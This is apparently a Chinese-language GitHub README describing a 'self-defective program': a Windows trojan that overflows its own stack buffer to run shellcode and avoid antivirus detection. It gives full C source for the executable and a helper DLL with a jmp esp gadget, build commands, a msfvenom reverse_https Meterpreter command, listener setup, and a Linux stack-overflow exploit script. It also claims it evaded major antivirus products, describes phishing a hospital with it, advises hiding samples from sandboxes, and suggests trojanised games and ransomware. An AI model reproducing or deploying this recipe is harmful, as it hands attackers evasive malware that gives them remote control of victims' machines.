# Self-Defective-Program
Video：https://github.com/baimao-box/Self-Defective-Program/blob/main/video/sdp.mp4

# 前言
如今恶意软件（如勒索病毒，木马）的制作方式基本都是分配内存--载入内存--将恶意代码变成执行程序--执行线程--等待线程执行完毕，本篇文章介绍了一种新型的恶意软件制作方式，它将不使用任何Windows API函数，也能执行恶意代码，杀毒软件（微软Defender，360，天守安全软件，火绒，腾讯管家）都无法检测这种新型恶意程序，并且探讨了如何制作和检测它。
 前两年有人在网上发过相关的思路，但是使用这个方法的人并不多，我查看了代码后发现其缺乏了通用性和稳定性，调试很久才能在当前系统上运行，但是我解决了通用性和稳定性的问题，只需要编译调试一次，所有windows平台都可以稳定执行恶意代码
![1dcc127e0e7e117bbfa6d42210c682b.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1714537831951-f9bc6937-238a-4ec2-8cf5-8a56be1f1321.png#averageHue=%2338d28c&clientId=u8110e1d7-f2d5-4&from=paste&height=867&id=ud6a275d1&originHeight=1300&originWidth=2044&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=1261417&status=done&style=none&taskId=u6a7b0889-def8-4968-a28a-6c2ca83b154&title=&width=1362.6666666666667)
![43840ecaf0bcc1a397df0702f0267f6.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1714537842730-a29a5f9b-28e8-4df5-91cb-640769de357f.png#averageHue=%23080909&clientId=u8110e1d7-f2d5-4&from=paste&height=330&id=ud950d87e&originHeight=495&originWidth=2029&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=84866&status=done&style=none&taskId=uc81c276d-88ba-43c2-8da0-7c72442b9cc&title=&width=1352.6666666666667)
# 原理介绍
攻击者可以故意在程序里留下一个栈溢出漏洞，在受害者点击恶意程序时，恶意程序会对自己触发栈溢出攻击，就不再需要再将恶意代码分配、载入内存，执行线程等方式执行恶意代码，这样可以绕过杀毒软件的行为检测。
这种恶意程序很难被检测到，因为它是一个正常的程序，只不过在内部的某个函数里存在栈溢出漏洞，杀软无法检测程序是否存在栈溢出漏洞，所以也无法禁止这个程序运行。
如果只是普通的栈溢出的话，是很不稳定的（比如网上唯二的那篇教程），他是获取了shellcode在内存中的地址后才去编写payload的
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1714535564203-129f9b8c-697f-48e0-91f3-04f9abc13b7b.png#averageHue=%23eaeae8&clientId=u8110e1d7-f2d5-4&from=paste&height=521&id=u059ae38d&originHeight=781&originWidth=1134&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=647105&status=done&style=none&taskId=u52e6adff-fe9c-4cd0-a2b4-28a3371655c&title=&width=756)
但是不同系统，不同环境，载入的地址都是不同的，所以获取了shellcode在内存中的地址只能在本机上适用，无法达到通用性
不稳定的第二点是他是直接在溢出字符后面跟上恶意代码，由于栈上会存在其他的原始数据，所以很容易执行失败，无法达到稳定性

而第二个文章他虽然写的很详细，但是还是无法达到通用性，并且制作难度太高
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1714536266173-d3b4a27e-09b8-4a66-8db6-03ea3d8be03d.png#averageHue=%234a2e08&clientId=u8110e1d7-f2d5-4&from=paste&height=620&id=u655c4a19&originHeight=930&originWidth=1471&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=122796&status=done&style=none&taskId=u968fb08d-cde2-4057-982a-2de070cda3a&title=&width=980.6666666666666)
因为他跳转所使用的方法是通过ret指令跳转到esp寄存器地址执行的，这个esp寄存器地址也是直接获取的，并不是jmp esp指令，但是前面也说过，但是不同系统，不同环境，载入的地址都是不同的，直接获取获取esp地址，稳定性也还是疑问
制作过程太复杂，门槛太高，所以一直不是免杀的主流技术

在网上，我只找到了这两篇文章，并且都是最近发布的，提出了思路，但是还有很多问题未解决，比如稳定性、通用性、制作的简易程度，如果这些问题都解决了，那这项技术将对免杀带来很大冲击，因为不使用任何Windows API函数的恶意程序，大部分杀软都是无法检测的
但是我解决了通用性和稳定性的问题，制作难度还比一般的免杀简单，只需要编译调试一次，所有windows平台都可以稳定执行恶意代码，并且实测能过微软Defender，360，天守安全软件，火绒，腾讯管家以及最新的360开启了ai和引擎选项的手动检测云沙箱
![4WJP6~JD0Q%F%$HEC1SNV_4.jpg](https://cdn.nlark.com/yuque/0/2024/jpeg/27444040/1714537746462-0f609fc2-2edc-4792-ae42-fbeb4dbc5ae1.jpeg#averageHue=%23fbfafa&clientId=u8110e1d7-f2d5-4&from=paste&height=316&id=u48835da1&originHeight=474&originWidth=631&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=27304&status=done&style=none&taskId=ufe056455-21dc-4697-b510-765bba5ecac&title=&width=420.6666666666667)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1714538638319-aef9f31a-0dab-43d1-9c1d-4a8cd6e4100a.png#averageHue=%23ddda8d&clientId=u8110e1d7-f2d5-4&from=paste&height=159&id=u53580635&originHeight=238&originWidth=933&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=76552&status=done&style=none&taskId=uba087e8e-4ed6-4bfc-9095-d81516777df&title=&width=622)
# 程序制作
## 什么是栈溢出？
在程序运行时，系统会为程序在内存里生成一个固定空间，如果超过了这个空间，就会造成缓冲区溢出，可以导致程序运行失败、系统宕机、重新启动等后果。更为严重的是，甚至可以取得系统特权，进而进行各种非法操作
程序在运行时，会在内存里生成一个栈空间，这个栈空间里会存放用户输入的一些值和寄存器里的值，栈溢出攻击就是我们输入的字符覆盖掉了特殊的寄存器里的值，控制特殊的寄存器，从而达到控制程序执行流的一个效果
![](https://cdn.nlark.com/yuque/0/2024/png/27444040/1714035392774-7cef4904-ff7f-4de8-892e-fdfe4d8efda4.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_768%2Climit_0#averageHue=%23f3f3f3&from=url&id=gkBnE&originHeight=403&originWidth=768&originalType=binary&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&title=)

## 什么是eip寄存器？
**EIP** 寄存器是指在英特尔系列处理器中用于存储下一条要执行的指令地址的寄存器。**EIP** 是英特尔处理器体系结构中特有的寄存器名，它代表了执行指令的当前位置或下一条要执行的指令的位置，在32位和16位程序里存在
## 什么是nop指令？
**NOP** 指令（No Operation）是一种在计算机汇编语言中常见的指令，它的作用是不执行任何操作，即空操作。
## 栈溢出执行shellcode流程
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1714552522708-735839bc-ac7e-42ab-b59c-93e89e47546b.png#averageHue=%23fdfdfc&clientId=u969e5b05-b542-4&from=paste&height=223&id=u89a0adbc&originHeight=334&originWidth=1503&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=31437&status=done&style=none&taskId=u163a2b9d-349f-499a-86b3-d63e3a1ea8d&title=&width=1002)
这里拿一个存在栈溢出漏洞的Linux程序来演示一下，可以更方便的理解栈溢出执行shellcode流程
## 什么是栈？
可以把栈想象成一个堆积的书本，你可以把新的书本放在最顶部，也可以取出最顶部的书本。

当程序执行时，它会使用栈来跟踪函数调用和变量的值。每次你调用一个函数，计算机会在栈上创建一个新的“帧”（就像书本一样），用来存储这个函数的局部变量和执行时的一些信息。当函数执行完毕时，这个帧会被从栈上移除，就像取出一本书本一样。

栈通常是“后进先出”的，这意味着最后放入栈的数据会最先被取出。这是因为栈的操作是非常快速和高效的，所以它经常用于管理函数调用和跟踪程序执行流程
## 为什么要覆盖ret返回地址？
覆盖 ret 返回地址是一种计算机攻击技巧，攻击者利用它来改变程序执行的路径。这个过程有点像将一个路标或导航指令替换成你自己的指令，以便程序执行到你想要的地方。

想象一下，你在开车时遇到一个交叉路口，路标告诉你向左拐才能到达目的地。但是，攻击者可能会悄悄地改变路标，让你误以为需要向右拐。当你按照这个伪装的路标行驶时，你最终会到达攻击者想要的地方，而不是你本来的目的地。

在计算机中，程序执行的路径通常是通过返回地址控制的，这个返回地址告诉计算机在函数执行完毕后应该继续执行哪里的代码。攻击者可以通过修改这个返回地址，迫使程序跳转到他们指定的地方，通常是一段恶意代码，而不是正常的程序代码
## 获取ret返回地址
使用gdb打开程序，在执行leave指令的地方下一个断点
![](https://img-blog.csdnimg.cn/11d479c6260b4a3c89383958be65d347.png#id=NqDsE&originHeight=299&originWidth=594&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
运行程序，随便输入一些字符，然后查看栈状态
```
x/100wx $esp
```
![](https://img-blog.csdnimg.cn/29dd75c07bfa4fbfba42dc8324af1723.png#id=s3Qh1&originHeight=585&originWidth=750&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
另外开一个远程连接界面，使用gdb打开程序，在执行ret指令的地方下一个断点
![](https://img-blog.csdnimg.cn/8c83a2f252544df5a83a0ecb0af90474.png#id=wCbEG&originHeight=1013&originWidth=1716&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
在第二个终端界面运行程序，随便输入一些字符，然后执行ret指令，查看程序跳转的地址
![](https://img-blog.csdnimg.cn/dce35252894c457dafe7ebdecccadb9c.png#id=GfbTY&originHeight=488&originWidth=642&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
![](https://img-blog.csdnimg.cn/0c491badbec348458a38504a3dfcd960.png#id=W7c0M&originHeight=496&originWidth=1403&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
根据计算，我们需要80个字符就能完全覆盖ret的返回地址，然后再将我们的shellcode放到控制数据的堆栈里
![](https://img-blog.csdnimg.cn/e543522938ef4064998c87871b494942.png#id=Zze62&originHeight=301&originWidth=557&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
## 脚本编写
```
import struct

padding = "A" * 76
eip = struct.pack("I",0xbffff7c0)
nopnop = "\x90"*64
payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x88"

print padding+eip+nopnop+payload
```
首先设置一个76位的垃圾字符，然后利用struct模块的pack功能，作用是将一个无符号整数（I 表示无符号整数）转换为二进制数据，跳转到控制数据的栈里，最后写入nop指令和shellcode代码，shellcode代码可以在这个网站里找到
```
http://shell-storm.org/shellcode/files/shellcode-811.html
```
![](https://img-blog.csdnimg.cn/e72e559cbcef42639fe2807ca851722b.png#id=Jowr5&originHeight=666&originWidth=824&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
```
 (python stack5exp.py ; cat) | /opt/protostar/bin/stack5
```
执行脚本，获得shell
![](https://img-blog.csdnimg.cn/55370e694ef146e9be331d801e6ddad6.png#id=dR503&originHeight=106&originWidth=686&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
## 自缺陷程序源代码
在程序执行时，由于系统或者环境原因，内存地址都是随机的，无法准确知道jmp esp指令地址，但可以编写一个dll程序，在dll程序里写入jmp esp指令，编译时可以指定dll程序运行的固定地址，之后在不同的环境，dll库地址也是固定的，然后编译恶意程序时调用dll库，这样就有一个固定的jmp esp地址，在受害者点击恶意程序时，程序会发生栈溢出，然后调用jmp esp指令地址，执行恶意代码
文件名为sdp.c
```
#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

void Function(char *Input);

int main(int argc, char *argv[]) {
    Vuln();  #调用dll库里一个无意义函数，保证程序在编译时引用dll库
    char buff[10000];
    memset(buff, 'A', 2012);  #溢出点在2012个字符
    
    char addr[] = "\x8c\x14\x50\x62";  #dll里jmp esp指令地址
    
    char nop[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";  #nop滑梯，覆盖栈上的源数据
    unsigned char code[] = ""; #shellcode，直接用的msf生成的反向连接
    
    memcpy(buff + 2012, addr, sizeof(addr) - 1); #在2012字符后面加上jmp esp指令的地址
    memcpy(buff + 2012 + sizeof(addr) - 1, nop, sizeof(nop) - 1);  #在jmp esp指令的地址后面加上nop指令
    memcpy(buff + 2012 + sizeof(addr) - 1 + sizeof(nop) - 1, code, sizeof(code) - 1);  #在nop指令后面就是恶意代码
    
    Function(buff);  #将payload传入存在缓冲区溢出的函数里

    return 0;
}

void Function(char *Input) {
    char Buffer2S[2000];  #固定缓冲区大小，溢出点在2012个字符
    strcpy(Buffer2S, Input);  #调用strcpy函数，触发缓冲区溢出
}
```
shellcode直接用msf生成即可，然后放入code变量里，指定shellcode格式是32位的，然后排除\x00，因为\x00在汇编里意思的是空字符，程序运行到\x00就会停下
```
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.101 LPORT=8011 EXITFUNC=thread -f c -a x86 -b "\x00"
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1714555097939-beed0608-ef01-48ad-bfef-bdb62f0873af.png#averageHue=%230b0c0c&clientId=u969e5b05-b542-4&from=paste&height=547&id=udce73edc&originHeight=820&originWidth=1737&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=196613&status=done&style=none&taskId=u6ee09d41-719f-4653-af8c-69632a9612d&title=&width=1158)
DLL源代码，文件名为fun.c
```
#include <stdio.h>

void Vuln() {  #前面exe程序编译时调用dll库里的一个函数
	int a = 1;
}

void Jmp_Esp() {   #提供jmp esp指令的函数
	__asm__("jmp *%esp\n\t"
		"jmp *%eax\n\t"
		"pop %eax\n\t"
		"pop %eax\n\t"
		"ret");
}
```
正常恶意程序执行与自缺陷程序执行流程图：
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1714553465068-0a47ce78-4cbe-4f22-8067-c416ab13ab59.png#averageHue=%23fdfdfd&clientId=u969e5b05-b542-4&from=paste&height=506&id=uba9cc54f&originHeight=759&originWidth=1959&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=68473&status=done&style=none&taskId=u685484d2-79f0-417b-8fc6-4b9cfe6b34d&title=&width=1306)
## 编译程序
首先编译dll，将源文件编译成目标文件（object file），用于后续的链接操作，指定文件是32位的
```
gcc.exe -c fun.c -m32
```
然后生成一个动态链接库，指定动态链接库的装载地址（Image Base），即库在内存中的起始地址，指定文件是32位的。这里设置为0x62500000
```
gcc.exe -shared -o fun.dll -Wl,--out-implib=libessfun.a -Wl,--image-base=0x62500000 fun.o -m32
```
-Wl,--out-implib=libessfunc.a: 这里 -Wl 是 GCC 的选项，用于将其后的参数传递给链接器（ld）。--out-implib=libessfunc.a 告诉链接器生成一个导入库（import library）文件，文件名为 libessfun.a。导入库通常用于在链接时指定依赖关系，以便其他程序可以在编译时正确链接到动态链接库
最后编译可执行文件链接到libessfun.a库，然后让程序在后台运行，并指定文件是32位的
```
gcc.exe sdp.c -o sdp.exe ./libessfun.a -m32 -mwindows
```
编译完成后文件夹里应该有这些文件
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1714555309795-3bdbb595-7654-4f70-9b21-d1f7848a8d25.png#averageHue=%231a1919&clientId=u969e5b05-b542-4&from=paste&height=511&id=u7e5ed139&originHeight=766&originWidth=1446&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=45233&status=done&style=none&taskId=ucfc0b5f4-0bc0-430e-9300-3861b602957&title=&width=964)
并且程序没有dll文件就无法正常执行，说明程序链接成功了
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1714555341512-04092b22-f389-4da3-8d39-7c453e488cdd.png#averageHue=%23efeae9&clientId=u969e5b05-b542-4&from=paste&height=173&id=ubd9b1177&originHeight=259&originWidth=700&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=52167&status=done&style=none&taskId=ua53d3294-4d4c-4e9d-9bae-982312f82b3&title=&width=466.6666666666667)
## 找到dll库里jmp esp指令地址
由于这是第一次编译dll库，我们还不知道jmp esp指令的地址，只有找到这个了地址，之后想改变程序的恶意代码，就只用修改sdp.c的shellcode即可，然后编译sdp.c文件，其他的都不用变

找dll库里汇编指令地址要用到Immunity Debugger程序和mona插件
Immunity Debugger程序下载：
```
https://www.immunityinc.com/products/debugger/
```
mona插件下载：
```
https://github.com/corelan/mona
```
然后将mona.py放到（Immunity Debugger安装地址）\Immunity Debugger\PyCommands目录下即可

打开Immunity Debugger，将sdp.exe程序拖入，然后在最下面的指令执行界面输入
```
!mona find -s "\xff\xe4" -m fun.dll
```
这里我们要寻找jmp esp指令的地址，jmp esp汇编指令转换成十六进制就是\xff\xe4
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1714555908566-440646a3-cdbd-4c53-8611-9b4baea285bf.png#averageHue=%23323030&clientId=u969e5b05-b542-4&from=paste&height=243&id=u0c77dbff&originHeight=364&originWidth=1351&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=94712&status=done&style=none&taskId=u0e807e02-6280-4d2f-b319-8a148677670&title=&width=900.6666666666666)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1714556006387-bc917c43-a61c-493b-b9f0-f41525f9178d.png#averageHue=%23050000&clientId=u969e5b05-b542-4&from=paste&height=51&id=ubc68ea4b&originHeight=76&originWidth=466&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=11069&status=done&style=none&taskId=ufbf8d84d-637a-40ad-bbe6-198bdd9ba55&title=&width=310.6666666666667)
然后在fun.dll里找到了jmp esp指令的地址，0x62501443，然后回到sdp.c源文件里，修改jmp esp地址的值，需要主要的是，这个程序是一个小端序，在小端序中，多字节数据的最低有效字节（即最低地址处的字节）存储在内存的最低地址处，而最高有效字节存储在最高地址处。举个例子，对于一个 32 位整数 0x12345678，在小端序系统中，它在内存中的存储顺序是 78 56 34 12，最低有效字节 78 存储在最低地址处，最高有效字节 12 存储在最高地址处，所以这里要从后往前输入
```
char addr[] = "\x43\x14\x50\x62";  #dll里jmp esp指令地址
```
最后再编译一次程序就可以了
```
gcc.exe sdp.c -o sdp.exe ./libessfun.a -m32 -mwindows
```
# msf设置监听并获取返回shell
打开msfconsole，设置监听模块
```
use exploit/multi/handler
```
设置payload
```
set payload windows/meterpreter/reverse_https
```
然后设置lhost和lport，要和上面木马生成的保持一致
```
set lhost 192.168.0.101
set lport 8011
```
最后设置EXITFUNC，输入run开启监听
```
set EXITFUNC thread
run
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1714556583853-6b52e708-be73-46aa-b47b-f4c350c09025.png#averageHue=%23070808&clientId=u969e5b05-b542-4&from=paste&height=181&id=u991505fc&originHeight=271&originWidth=1135&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=41028&status=done&style=none&taskId=u376ae1cb-de96-4a36-833c-6a6778e828a&title=&width=756.6666666666666)
当受害者点击sdp.exe时，主机就会执行msf生成的恶意代码，返回一个shell，需要注意的是，sdp.exe和fun.dll需要在同一目录下
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1714556669069-62feac59-3b78-461a-8edf-2f04d9c466d4.png#averageHue=%23090a0a&clientId=u969e5b05-b542-4&from=paste&height=362&id=u746f8012&originHeight=543&originWidth=1735&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=113861&status=done&style=none&taskId=uc2d9137e-51e6-4182-8d8b-7188e0df55c&title=&width=1156.6666666666667)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1714556694804-b7a58e7f-7b9a-4fba-87bb-39e9fbf8af0b.png#averageHue=%232e201f&clientId=u969e5b05-b542-4&from=paste&height=103&id=u1e3eaa0a&originHeight=154&originWidth=1018&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=22486&status=done&style=none&taskId=ub09da3e3-1ab1-4456-b6db-9b141924b0d&title=&width=678.6666666666666)
实测，可以过国内的所有杀软和windows的defender，并且可以通过最新的360开启了ai和引擎选项的手动检测云沙箱
![4WJP6~JD0Q%F%$HEC1SNV_4.jpg](https://cdn.nlark.com/yuque/0/2024/jpeg/27444040/1714537746462-0f609fc2-2edc-4792-ae42-fbeb4dbc5ae1.jpeg#averageHue=%23fbfafa&clientId=u8110e1d7-f2d5-4&from=paste&height=316&id=Fdjmn&originHeight=474&originWidth=631&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=27304&status=done&style=none&taskId=ufe056455-21dc-4697-b510-765bba5ecac&title=&width=420.6666666666667)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1714538638319-aef9f31a-0dab-43d1-9c1d-4a8cd6e4100a.png#averageHue=%23ddda8d&clientId=u8110e1d7-f2d5-4&from=paste&height=159&id=J4P2J&originHeight=238&originWidth=933&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=76552&status=done&style=none&taskId=uba087e8e-4ed6-4bfc-9095-d81516777df&title=&width=622)
# 实战
在四月底的时候，我参加了一个红队项目，有授权，也允许钓鱼，我们的目标是一个市的医院，但是很难打开入口点，这时我就用了这个新技术生成的木马，钓鱼成功拿到了一个医院的内网入口
# 想说的
这个程序的源代码比很多免杀简单多了，甚至比普通生成的木马还简单，并且是稳定运行和上线的，我都实测了，只需要第一次编译时要找dll的jmp esp指令的地址，之后就只用改shellcode和编译sdp.c文件了，dll就只用编译一次
这种恶意程序很难被检测到，因为它是一个正常的程序，只不过在内部的某个函数里存在栈溢出漏洞，杀软无法检测程序是否存在栈溢出漏洞，所以也无法禁止这个程序运行
程序内没有任何Windows API函数，只用了strcpy、memset、memcpy这三个函数就能达成攻击，杀软是无法检测的
最好不要上传微步沙箱这些检测平台，如果上传了，你这个文件特征就会被记住，之后要重新编译或者修改特征才行的，我之前上传过，微步沙箱给这个程序标记的是安全
# 检测与防护
针对使用这个技术生成的木马程序，只能用内存检测的方法，因为恶意代码是在内存里运行的，静态免杀没办法，我简单弄一个aes加密混淆shellcode的，实测卡巴斯基都无法检测出来
# 思考
这个新技术对免杀挺冲击的，以后就不用那么复杂的进行免杀，直接用这个技术即可，简单还稳定，并且也有多种组合技，比如修改游戏的汇编代码，启动程序的时候就会执行sdp.exe，游戏是正常运行的，就算关闭游戏，木马还是在后台运行的，实测国内杀软只有火绒会检测出来，Windows的defender还是无法检测出来
![](https://cdn.nlark.com/yuque/0/2024/jpeg/27444040/1714386672229-8f0c7b80-bb7e-4e79-90c0-fd9b416530e4.jpeg?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_1125%2Climit_0%2Finterlace%2C1#averageHue=%236a7596&from=url&id=XQQLY&originHeight=656&originWidth=1125&originalType=binary&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&title=)
![eb9a685557c406b8c4086a839b8b9a9.jpg](https://cdn.nlark.com/yuque/0/2024/jpeg/27444040/1714386678557-3f218bb6-8dde-45ea-823e-80657ea6bc74.jpeg#averageHue=%232e4050&clientId=udf3fb53b-28da-4&from=paste&height=107&id=ue50e1dcf&originHeight=160&originWidth=1266&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=61641&status=done&style=none&taskId=u5094cce8-6ffe-4703-b219-d1679e71d3f&title=&width=844)
![a656b0b8ba68098d490774856b5951f.jpg](https://cdn.nlark.com/yuque/0/2024/jpeg/27444040/1714386682738-8373979f-1893-4fe9-a118-9dd55b3654e5.jpeg#averageHue=%23263e51&clientId=udf3fb53b-28da-4&from=paste&height=244&id=ufab98ad5&originHeight=366&originWidth=918&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=48535&status=done&style=none&taskId=uac074245-90ff-4fb9-83be-06c3d3850fd&title=&width=612)
# 最后
这个技术是我在睡觉时想出来的，当时没有看过相关文章，关于这个恶意程序，除了木马，也可以利用做其他事，比如勒索病毒什么的，目前隐患还是蛮大的，学习原理才能找到更多思路
